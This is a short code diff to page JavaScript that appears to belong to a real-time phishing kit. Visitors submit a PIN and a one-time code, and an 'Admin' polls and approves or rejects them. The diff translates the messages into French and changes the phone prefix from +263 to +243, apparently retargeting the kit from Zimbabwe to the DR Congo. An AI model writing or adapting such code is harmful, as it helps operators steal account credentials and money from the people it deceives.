       document.getElementById('errOtp').style.display = 'block';
     }
   }
@@ -576,14 +565,14 @@
         } 
         else if (status === 'rejected_4') {
           stopPolling();
-          alert('Your application was rejected. Please try again.');
+          alert('Votre demande a été rejetée. Veuillez réessayer.');
           showPage('page2');
           document.getElementById('formQuestionnaire').querySelector('button').disabled = false;
         } 
         else if (status === 'approved_all') {
           stopPolling();
           const phone = document.getElementById('pPhone').value;
-          document.getElementById('otpPhoneDisplay').textContent = '+263 ' + phone;
+          document.getElementById('otpPhoneDisplay').textContent = '+243 ' + phone;
           showPage('page4');
         } 
         else if (status === 'completed') {
@@ -592,11 +581,10 @@
         } 
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert('The Admin rejected your PIN/OTP. Please try again.');
+          alert('L admin a rejeté votre PIN/OTP. Veuillez réessayer.');
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
           document.querySelectorAll('#pinContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
-          // Since PIN might be rejected, we send them back to the Login screen
           showPage('page3');
         }
       } catch (err) { console.error(err); }
